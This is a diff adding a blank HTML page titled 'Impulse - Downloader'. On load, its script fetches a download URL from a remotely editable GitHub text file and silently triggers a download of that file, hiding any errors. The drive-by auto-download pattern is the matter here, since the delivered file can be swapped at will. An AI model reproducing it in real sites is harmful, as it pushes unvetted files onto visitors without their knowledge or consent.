@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Impulse - Downloader</title>
+  <script>
+    window.onload = () => {
+      fetch("https://raw.githubusercontent.com/pasteisback/ImpulseFiles/refs/heads/main/Version/download.txt")
+        .then(res => res.text())
+        .then(url => {
+          url = url.trim();
+          const a = document.createElement("a");
+          a.href = url;
+          a.download = "";
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+        })
+        .catch(() => {
+
+        });
+    };
+  </script>
+</head>
+<body style="margin:0; background:#000;"></body>
+</html>
